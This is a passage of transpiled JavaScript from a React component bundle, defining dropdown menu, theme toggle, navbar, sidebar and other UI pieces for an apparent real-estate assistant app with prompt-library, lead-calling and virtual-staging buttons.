var SheetDescription = React2.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime2.jsx)(SheetPrimitive.Description, _object_spread({
        ref: ref,
        className: cn("text-sm text-muted-foreground", className)
    }, props));
});
SheetDescription.displayName = SheetPrimitive.Description.displayName;
// src/components/navbar/theme-toggle.tsx
var React4 = __toESM(require("react"));
var import_lucide_react3 = require("lucide-react");
var import_next_themes = require("next-themes");
// src/components/ui/dropdown-menu.tsx
var React3 = __toESM(require("react"));
var DropdownMenuPrimitive = __toESM(require("@radix-ui/react-dropdown-menu"));
var import_lucide_react2 = require("lucide-react");
var import_jsx_runtime3 = require("react/jsx-runtime");
var DropdownMenu = DropdownMenuPrimitive.Root;
var DropdownMenuTrigger = DropdownMenuPrimitive.Trigger;
var DropdownMenuGroup = DropdownMenuPrimitive.Group;
var DropdownMenuPortal = DropdownMenuPrimitive.Portal;
var DropdownMenuSub = DropdownMenuPrimitive.Sub;
var DropdownMenuRadioGroup = DropdownMenuPrimitive.RadioGroup;
var DropdownMenuSubTrigger = React3.forwardRef(function(_param, ref) {
    var className = _param.className, inset = _param.inset, children = _param.children, props = _object_without_properties(_param, [
        "className",
        "inset",
        "children"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)(DropdownMenuPrimitive.SubTrigger, _object_spread_props(_object_spread({
        ref: ref,
        className: cn("flex cursor-default gap-2 select-none items-center rounded-sm px-2 py-1.5 text-sm outline-none focus:bg-accent data-[state=open]:bg-accent [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0", inset && "pl-8", className)
    }, props), {
        children: [
            children,
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(import_lucide_react2.ChevronRight, {
                className: "ml-auto"
            })
        ]
    }));
});
DropdownMenuSubTrigger.displayName = DropdownMenuPrimitive.SubTrigger.displayName;
var DropdownMenuSubContent = React3.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(DropdownMenuPrimitive.SubContent, _object_spread({
        ref: ref,
        className: cn("z-50 min-w-[8rem] overflow-hidden rounded-md border bg-popover p-1 text-popover-foreground shadow-lg data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", className)
    }, props));
});
DropdownMenuSubContent.displayName = DropdownMenuPrimitive.SubContent.displayName;
var DropdownMenuContent = React3.forwardRef(function(_param, ref) {
    var className = _param.className, _param_sideOffset = _param.sideOffset, sideOffset = _param_sideOffset === void 0 ? 4 : _param_sideOffset, props = _object_without_properties(_param, [
        "className",
        "sideOffset"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(DropdownMenuPrimitive.Portal, {
        children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(DropdownMenuPrimitive.Content, _object_spread({
            ref: ref,
            sideOffset: sideOffset,
            className: cn("z-50 min-w-[8rem] overflow-hidden rounded-md border bg-popover p-1 text-popover-foreground shadow-md", "data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", className)
        }, props))
    });
});
DropdownMenuContent.displayName = DropdownMenuPrimitive.Content.displayName;
var DropdownMenuItem = React3.forwardRef(function(_param, ref) {
    var className = _param.className, inset = _param.inset, props = _object_without_properties(_param, [
        "className",
        "inset"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(DropdownMenuPrimitive.Item, _object_spread({
        ref: ref,
        className: cn("relative flex cursor-default select-none items-center gap-2 rounded-sm px-2 py-1.5 text-sm outline-none transition-colors focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50 [&>svg]:size-4 [&>svg]:shrink-0", inset && "pl-8", className)
    }, props));
});
DropdownMenuItem.displayName = DropdownMenuPrimitive.Item.displayName;
var DropdownMenuCheckboxItem = React3.forwardRef(function(_param, ref) {
    var className = _param.className, children = _param.children, checked = _param.checked, props = _object_without_properties(_param, [
        "className",
        "children",
        "checked"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)(DropdownMenuPrimitive.CheckboxItem, _object_spread_props(_object_spread({
        ref: ref,
        className: cn("relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none transition-colors focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50", className),
        checked: checked
    }, props), {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("span", {
                className: "absolute left-2 flex h-3.5 w-3.5 items-center justify-center",
                children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(DropdownMenuPrimitive.ItemIndicator, {
                    children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(import_lucide_react2.Check, {
                        className: "h-4 w-4"
                    })
                })
            }),
            children
        ]
    }));
});
DropdownMenuCheckboxItem.displayName = DropdownMenuPrimitive.CheckboxItem.displayName;
var DropdownMenuRadioItem = React3.forwardRef(function(_param, ref) {
    var className = _param.className, children = _param.children, props = _object_without_properties(_param, [
        "className",
        "children"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)(DropdownMenuPrimitive.RadioItem, _object_spread_props(_object_spread({
        ref: ref,
        className: cn("relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none transition-colors focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50", className)
    }, props), {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("span", {
                className: "absolute left-2 flex h-3.5 w-3.5 items-center justify-center",
                children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(DropdownMenuPrimitive.ItemIndicator, {
                    children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(import_lucide_react2.Circle, {
                        className: "h-2 w-2 fill-current"
                    })
                })
            }),
            children
        ]
    }));
});
DropdownMenuRadioItem.displayName = DropdownMenuPrimitive.RadioItem.displayName;
var DropdownMenuLabel = React3.forwardRef(function(_param, ref) {
    var className = _param.className, inset = _param.inset, props = _object_without_properties(_param, [
        "className",
        "inset"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(DropdownMenuPrimitive.Label, _object_spread({
        ref: ref,
        className: cn("px-2 py-1.5 text-sm font-semibold", inset && "pl-8", className)
    }, props));
});
DropdownMenuLabel.displayName = DropdownMenuPrimitive.Label.displayName;
var DropdownMenuSeparator = React3.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(DropdownMenuPrimitive.Separator, _object_spread({
        ref: ref,
        className: cn("-mx-1 my-1 h-px bg-muted", className)
    }, props));
});
DropdownMenuSeparator.displayName = DropdownMenuPrimitive.Separator.displayName;
var DropdownMenuShortcut = function(_param) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("span", _object_spread({
        className: cn("ml-auto text-xs tracking-widest opacity-60", className)
    }, props));
};
DropdownMenuShortcut.displayName = "DropdownMenuShortcut";
// src/components/navbar/theme-toggle.tsx
var import_jsx_runtime4 = require("react/jsx-runtime");
function ThemeToggle(param) {
    var className = param.className, _param_collapsed = param.collapsed, collapsed = _param_collapsed === void 0 ? false : _param_collapsed;
    var _ref = (0, import_next_themes.useTheme)(), theme = _ref.theme, setTheme = _ref.setTheme;
    var _React4_useState = _sliced_to_array(React4.useState(false), 2), mounted = _React4_useState[0], setMounted = _React4_useState[1];
    React4.useEffect(function() {
        setMounted(true);
    }, []);
    if (!mounted) {
        return null;
    }
    var Icon = theme === "dark" ? import_lucide_react3.Moon : theme === "system" ? import_lucide_react3.Monitor : import_lucide_react3.Sun;
    return /* @__PURE__ */ (0, import_jsx_runtime4.jsxs)(DropdownMenu, {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(DropdownMenuTrigger, {
                asChild: true,
                children: collapsed ? /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(Button, {
                    variant: "ghost",
                    size: "sm",
                    className: "flex justify-center",
                    children: /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(Icon, {
                        className: "h-4 w-4"
                    })
                }) : /* @__PURE__ */ (0, import_jsx_runtime4.jsxs)(Button, {
                    variant: "ghost",
                    size: "sm",
                    className: className,
                    children: [
                        /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(Icon, {
                            className: "h-[1.2rem] w-[1.2rem]"
                        }),
                        /* @__PURE__ */ (0, import_jsx_runtime4.jsx)("span", {
                            className: "ml-2",
                            children: "Theme"
                        })
                    ]
                })
            }),
            /* @__PURE__ */ (0, import_jsx_runtime4.jsxs)(DropdownMenuContent, {
                align: "end",
                children: [
                    /* @__PURE__ */ (0, import_jsx_runtime4.jsxs)(DropdownMenuItem, {
                        onClick: function() {
                            return setTheme("light");
                        },
                        children: [
                            /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(import_lucide_react3.Sun, {
                                className: "mr-2 h-4 w-4"
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime4.jsx)("span", {
                                children: "Light"
                            }),
                            theme === "light" && /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(import_lucide_react3.Check, {
                                className: "ml-2 h-4 w-4"
                            })
                        ]
                    }),
                    /* @__PURE__ */ (0, import_jsx_runtime4.jsxs)(DropdownMenuItem, {
                        onClick: function() {
                            return setTheme("dark");
                        },
                        children: [
                            /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(import_lucide_react3.Moon, {
                                className: "mr-2 h-4 w-4"
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime4.jsx)("span", {
                                children: "Dark"
                            }),
                            theme === "dark" && /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(import_lucide_react3.Check, {
                                className: "ml-2 h-4 w-4"
                            })
                        ]
                    }),
                    /* @__PURE__ */ (0, import_jsx_runtime4.jsxs)(DropdownMenuItem, {
                        onClick: function() {
                            return setTheme("system");
                        },
                        children: [
                            /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(import_lucide_react3.Monitor, {
                                className: "mr-2 h-4 w-4"
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime4.jsx)("span", {
                                children: "System"
                            }),
                            theme === "system" && /* @__PURE__ */ (0, import_jsx_runtime4.jsx)(import_lucide_react3.Check, {
                                className: "ml-2 h-4 w-4"
                            })
                        ]
                    })
                ]
            })
        ]
    });
}
// src/components/navbar/navbar.tsx
var import_next_themes2 = require("next-themes");
var import_image = __toESM(require("next/image"));
var import_jsx_runtime5 = require("react/jsx-runtime");
function Navbar(param) {
    var onSelectPrompt = param.onSelectPrompt, onWriteClick = param.onWriteClick, _param_logoLight = param.logoLight, logoLight = _param_logoLight === void 0 ? "/REVA - dark.svg" : _param_logoLight, _param_logoDark = param.logoDark, logoDark = _param_logoDark === void 0 ? "/reVA.svg" : _param_logoDark, _param_navItems = param.navItems, navItems = _param_navItems === void 0 ? [
        {
            href: "/",
            label: "Home"
        },
        {
            href: "/about",
            label: "About"
        },
        {
            href: "/services",
            label: "Services"
        },
        {
            href: "/contact",
            label: "Contact"
        }
    ] : _param_navItems, actionButtons = param.actionButtons, promptMenuComponent = param.promptMenuComponent;
    var _ref = _sliced_to_array((0, import_react.useState)(false), 2), isScrolled = _ref[0], setIsScrolled = _ref[1];
    var _ref1 = _sliced_to_array((0, import_react.useState)(false), 2), isPromptMenuOpen = _ref1[0], setIsPromptMenuOpen = _ref1[1];
    var _ref2 = _sliced_to_array((0, import_react.useState)(false), 2), isLoggedIn = _ref2[0], setIsLoggedIn = _ref2[1];
    var theme = (0, import_next_themes2.useTheme)().theme;
    var promptMenuRef = (0, import_react.useRef)(null);
    var pathname = (0, import_navigation.usePathname)();
    (0, import_react.useEffect)(function() {
        var handleScroll = function() {
            setIsScrolled(window.scrollY > 10);
        };
        window.addEventListener("scroll", handleScroll);
        return function() {
            return window.removeEventListener("scroll", handleScroll);
        };
    }, []);
    (0, import_react.useEffect)(function() {
        var handleClickOutside = function(event) {
            if (promptMenuRef.current && !promptMenuRef.current.contains(event.target)) {
                setIsPromptMenuOpen(false);
            }
        };
        document.addEventListener("mousedown", handleClickOutside);
        return function() {
            return document.removeEventListener("mousedown", handleClickOutside);
        };
    }, []);
    var handlePromptSelect = function(prompt) {
        if (onSelectPrompt) {
            onSelectPrompt(prompt);
            setIsPromptMenuOpen(false);
        }
    };
    var handleAuthClick = function() {
        setIsLoggedIn(!isLoggedIn);
    };
    return /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("header", {
        className: cn("fixed top-0 left-0 right-0 z-50 transition-all duration-300", isScrolled ? "bg-background/80 backdrop-blur-lg border-b shadow-sm" : "bg-transparent"),
        children: /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("div", {
            className: "px-4 pr-8",
            children: /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)("div", {
                className: "flex h-16 items-center justify-between",
                children: [
                    /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_link.default, {
                        href: "/",
                        className: "flex items-center space-x-2",
                        children: theme === "light" ? /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_image.default, {
                            src: logoLight,
                            alt: "Logo",
                            width: 100,
                            height: 50
                        }) : /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_image.default, {
                            src: logoDark,
                            alt: "Logo",
                            width: 100,
                            height: 50
                        })
                    }),
                    /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)("div", {
                        className: "hidden md:flex items-center space-x-1",
                        children: [
                            navItems.map(function(item) {
                                return /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(NavItem, {
                                    href: item.href,
                                    isActive: pathname === item.href,
                                    children: item.label
                                }, item.href);
                            }),
                            promptMenuComponent && /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)("div", {
                                ref: promptMenuRef,
                                className: "relative",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)("button", {
                                        className: cn("relative px-3 py-2 rounded-md text-sm font-medium transition-colors flex items-center", isPromptMenuOpen ? "text-primary" : "text-foreground/70 hover:text-foreground hover:bg-accent"),
                                        onClick: function() {
                                            return setIsPromptMenuOpen(!isPromptMenuOpen);
                                        },
                                        onMouseEnter: function() {
                                            return setIsPromptMenuOpen(true);
                                        },
                                        children: [
                                            "GPT Prompts",
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_lucide_react4.ChevronDown, {
                                                className: "ml-1 h-4 w-4"
                                            })
                                        ]
                                    }),
                                    isPromptMenuOpen && promptMenuComponent
                                ]
                            })
                        ]
                    }),
                    /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)("div", {
                        className: "flex items-center space-x-2",
                        children: [
                            actionButtons || /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(import_jsx_runtime5.Fragment, {
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(Button, {
                                        variant: "outline",
                                        size: "icon",
                                        onClick: onWriteClick,
                                        className: "hidden md:flex relative group",
                                        "data-write-button": "true",
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_lucide_react4.PenLine, {
                                                className: "h-5 w-5"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                className: "sr-only",
                                                children: "Write"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                className: "absolute inset-x-0 -bottom-10 px-2 py-1 bg-background border rounded text-xs whitespace-nowrap opacity-0 group-hover:opacity-100 transition-opacity shadow-lg",
                                                children: "Prompt Library"
                                            })
                                        ]
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(Button, {
                                        variant: "outline",
                                        size: "icon",
                                        className: "relative group",
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_lucide_react4.Phone, {
                                                className: "h-5 w-5"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                className: "sr-only",
                                                children: "Lead Calling"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                className: "absolute -top-2 -right-2 w-4 h-4 bg-destructive rounded-full flex items-center justify-center text-[10px] text-destructive-foreground",
                                                children: "3"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                className: "absolute inset-x-0 -bottom-10 px-2 py-1 bg-background border rounded text-xs whitespace-nowrap opacity-0 group-hover:opacity-100 transition-opacity shadow-lg",
                                                children: "Lead Calling"
                                            })
                                        ]
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(Button, {
                                        variant: "outline",
                                        size: "icon",
                                        className: "relative group",
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_lucide_react4.Sofa, {
                                                className: "h-5 w-5"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                className: "sr-only",
                                                children: "Virtual Staging"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                className: "absolute inset-x-0 -bottom-10 px-2 py-1 bg-background border rounded text-xs whitespace-nowrap opacity-0 group-hover:opacity-100 transition-opacity shadow-lg",
                                                children: "Virtual Staging"
                                            })
                                        ]
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(Button, {
                                        variant: "outline",
                                        size: "icon",
                                        className: "relative group",
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_lucide_react4.Camera, {
                                                className: "h-5 w-5"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                className: "sr-only",
                                                children: "Headshots"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                className: "absolute inset-x-0 -bottom-10 px-2 py-1 bg-background border rounded text-xs whitespace-nowrap opacity-0 group-hover:opacity-100 transition-opacity shadow-lg",
                                                children: "Headshots"
                                            })
                                        ]
                                    })
                                ]
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)("div", {
                                className: "flex pl-8",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(ThemeToggle, {
                                        className: "w-full justify-start",
                                        collapsed: true
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(Button, {
                                        variant: "default",
                                        size: "sm",
                                        className: "ml-2 hidden sm:flex items-center gap-1.5",
                                        onClick: handleAuthClick,
                                        children: /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(import_jsx_runtime5.Fragment, {
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_lucide_react4.LogOut, {
                                                    className: "h-4 w-4"
                                                }),
                                                /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                    children: "Log Out"
                                                })
                                            ]
                                        })
                                    })
                                ]
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("div", {
                                className: "md:hidden",
                                children: /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(Sheet, {
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(SheetTrigger, {
                                            asChild: true,
                                            children: /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(Button, {
                                                variant: "ghost",
                                                size: "icon",
                                                children: [
                                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_lucide_react4.Menu, {
                                                        className: "h-5 w-5"
                                                    }),
                                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                        className: "sr-only",
                                                        children: "Menu"
                                                    })
                                                ]
                                            })
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(SheetContent, {
                                            side: "right",
                                            className: "w-[300px] sm:w-[400px]",
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(SheetHeader, {
                                                    children: [
                                                        /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(SheetTitle, {
                                                            children: "Menu"
                                                        }),
                                                        /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(SheetDescription, {
                                                            children: "Navigate to different sections of the site."
                                                        })
                                                    ]
                                                }),
                                                /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)("div", {
                                                    className: "py-6 space-y-4",
                                                    children: [
                                                        /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(Button, {
                                                            variant: "outline",
                                                            className: "w-full justify-start gap-2",
                                                            onClick: onWriteClick,
                                                            "data-write-button": "true",
                                                            children: [
                                                                /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_lucide_react4.PenLine, {
                                                                    className: "h-4 w-4"
                                                                }),
                                                                "Prompt Library"
                                                            ]
                                                        }),
                                                        /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)("nav", {
                                                            className: "flex flex-col space-y-1",
                                                            children: [
                                                                navItems.map(function(item) {
                                                                    return /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(MobileNavItem, {
                                                                        href: item.href,
                                                                        isActive: pathname === item.href,
                                                                        children: item.label
                                                                    }, item.href);
                                                                }),
                                                                promptMenuComponent && /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(MobileNavItem, {
                                                                    href: "/gpt-prompts",
                                                                    isActive: pathname === "/gpt-prompts",
                                                                    children: "GPT Prompts"
                                                                })
                                                            ]
                                                        }),
                                                        /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("div", {
                                                            className: "pt-4 border-t",
                                                            children: /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(Button, {
                                                                variant: "default",
                                                                className: "w-full flex items-center justify-center gap-1.5",
                                                                onClick: handleAuthClick,
                                                                children: [
                                                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(ThemeToggle, {
                                                                        className: "w-full justify-start",
                                                                        collapsed: true
                                                                    }),
                                                                    /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(import_jsx_runtime5.Fragment, {
                                                                        children: [
                                                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_lucide_react4.LogOut, {
                                                                                className: "h-4 w-4"
                                                                            }),
                                                                            /* @__PURE__ */ (0, import_jsx_runtime5.jsx)("span", {
                                                                                children: "Log Out"
                                                                            })
                                                                        ]
                                                                    })
                                                                ]
                                                            })
                                                        })
                                                    ]
                                                })
                                            ]
                                        })
                                    ]
                                })
                            })
                        ]
                    })
                ]
            })
        })
    });
}
function NavItem(param) {
    var href = param.href, isActive = param.isActive, children = param.children;
    return /* @__PURE__ */ (0, import_jsx_runtime5.jsxs)(import_link.default, {
        href: href,
        className: cn("relative px-3 py-2 rounded-md text-sm font-medium transition-colors", isActive ? "text-primary" : "text-foreground/70 hover:text-foreground hover:bg-accent"),
        children: [
            children,
            isActive && /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_framer_motion.motion.div, {
                className: "absolute bottom-0 left-0 right-0 h-0.5 bg-primary",
                layoutId: "navbar-indicator",
                transition: {
                    type: "spring",
                    bounce: 0.2,
                    duration: 0.6
                }
            })
        ]
    });
}
function MobileNavItem(param) {
    var href = param.href, isActive = param.isActive, children = param.children;
    return /* @__PURE__ */ (0, import_jsx_runtime5.jsx)(import_link.default, {
        href: href,
        className: cn("flex items-center px-3 py-2 rounded-md text-sm font-medium transition-colors", isActive ? "bg-accent text-accent-foreground" : "hover:bg-accent hover:text-accent-foreground"),
        children: children
    });
}
// src/components/navbar/navbar-wrapper.tsx
var import_react2 = require("react");
var import_jsx_runtime6 = require("react/jsx-runtime");
function NavbarWrapper(param) {
    var logoLight = param.logoLight, logoDark = param.logoDark, navItems = param.navItems, actionButtons = param.actionButtons, promptModalComponent = param.promptModalComponent, promptMenuComponent = param.promptMenuComponent;
    var _ref = _sliced_to_array((0, import_react2.useState)(false), 2), isPromptModalOpen = _ref[0], setPromptModalOpen = _ref[1];
    return /* @__PURE__ */ (0, import_jsx_runtime6.jsxs)(import_jsx_runtime6.Fragment, {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime6.jsx)(Navbar, {
                onWriteClick: function() {
                    return setPromptModalOpen(true);
                },
                logoLight: logoLight,
                logoDark: logoDark,
                navItems: navItems,
                actionButtons: actionButtons,
                promptMenuComponent: promptMenuComponent
            }),
            promptModalComponent && /* @__PURE__ */ (0, import_jsx_runtime6.jsx)("div", {
                className: isPromptModalOpen ? "block" : "hidden",
                children: promptModalComponent
            })
        ]
    });
}
// src/components/sidebar/sidebar-left.tsx
var import_image2 = __toESM(require("next/image"));
// src/components/ui/sidebar.tsx
var React9 = __toESM(require("react"));
var import_react_slot2 = require("@radix-ui/react-slot");
var import_class_variance_authority3 = require("class-variance-authority");
// src/components/ui/input.tsx
var React5 = __toESM(require("react"));
var import_jsx_runtime7 = require("react/jsx-runtime");
var Input = React5.forwardRef(function(_param, ref) {
    var className = _param.className, type = _param.type, props = _object_without_properties(_param, [
        "className",
        "type"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime7.jsx)("input", _object_spread({
        type: type,
        className: cn("flex h-9 w-full rounded-md border border-input bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50 md:text-sm", className),
        ref: ref
    }, props));
});
Input.displayName = "Input";
// src/components/ui/separator.tsx
var React6 = __toESM(require("react"));
var SeparatorPrimitive = __toESM(require("@radix-ui/react-separator"));
var import_jsx_runtime8 = require("react/jsx-runtime");
var Separator2 = React6.forwardRef(function(_param, ref) {
    var className = _param.className, _param_orientation = _param.orientation, orientation = _param_orientation === void 0 ? "horizontal" : _param_orientation, _param_decorative = _param.decorative, decorative = _param_decorative === void 0 ? true : _param_decorative, props = _object_without_properties(_param, [
        "className",
        "orientation",
        "decorative"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime8.jsx)(SeparatorPrimitive.Root, _object_spread({
        ref: ref,
        decorative: decorative,
        orientation: orientation,
        className: cn("shrink-0 bg-border", orientation === "horizontal" ? "h-[1px] w-full" : "h-full w-[1px]", className)
    }, props));
});
Separator2.displayName = SeparatorPrimitive.Root.displayName;
// src/components/ui/skeleton.tsx
var import_jsx_runtime9 = require("react/jsx-runtime");
function Skeleton(_param) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime9.jsx)("div", _object_spread({
        className: cn("animate-pulse rounded-md bg-primary/10", className)
    }, props));
}
// src/components/ui/tooltip.tsx
var React7 = __toESM(require("react"));
var TooltipPrimitive = __toESM(require("@radix-ui/react-tooltip"));
var import_jsx_runtime10 = require("react/jsx-runtime");
var TooltipProvider = TooltipPrimitive.Provider;
var Tooltip = TooltipPrimitive.Root;
var TooltipTrigger = TooltipPrimitive.Trigger;
var TooltipContent = React7.forwardRef(function(_param, ref) {
    var className = _param.className, _param_sideOffset = _param.sideOffset, sideOffset = _param_sideOffset === void 0 ? 4 : _param_sideOffset, props = _object_without_properties(_param, [
        "className",
        "sideOffset"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime10.jsx)(TooltipPrimitive.Portal, {
        children: /* @__PURE__ */ (0, import_jsx_runtime10.jsx)(TooltipPrimitive.Content, _object_spread({
            ref: ref,
            sideOffset: sideOffset,
            className: cn("z-50 overflow-hidden rounded-md bg-primary px-3 py-1.5 text-xs text-primary-foreground animate-in fade-in-0 zoom-in-95 data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=closed]:zoom-out-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", className)
        }, props))
    });
});
TooltipContent.displayName = TooltipPrimitive.Content.displayName;
// src/components/ui/sidebar.tsx
var import_react_icons = require("@radix-ui/react-icons");
// src/hooks/use-mobile.tsx
var React8 = __toESM(require("react"));
var MOBILE_BREAKPOINT = 768;
function useIsMobile() {
    var _React8_useState = _sliced_to_array(React8.useState(void 0), 2), isMobile = _React8_useState[0], setIsMobile = _React8_useState[1];
    React8.useEffect(function() {
        var mql = window.matchMedia("(max-width: ".concat(MOBILE_BREAKPOINT - 1, "px)"));
        var onChange = function() {
            setIsMobile(window.innerWidth < MOBILE_BREAKPOINT);
        };
        mql.addEventListener("change", onChange);
        setIsMobile(window.innerWidth < MOBILE_BREAKPOINT);
        return function() {
            return mql.removeEventListener("change", onChange);
        };
    }, []);
    return !!isMobile;
}
// src/components/ui/sidebar.tsx
var import_jsx_runtime11 = require("react/jsx-runtime");
var SIDEBAR_COOKIE_NAME = "sidebar_state";
var SIDEBAR_COOKIE_MAX_AGE = 60 * 60 * 24 * 7;
var SIDEBAR_WIDTH = "16rem";
var SIDEBAR_WIDTH_MOBILE = "18rem";
var SIDEBAR_WIDTH_ICON = "3rem";
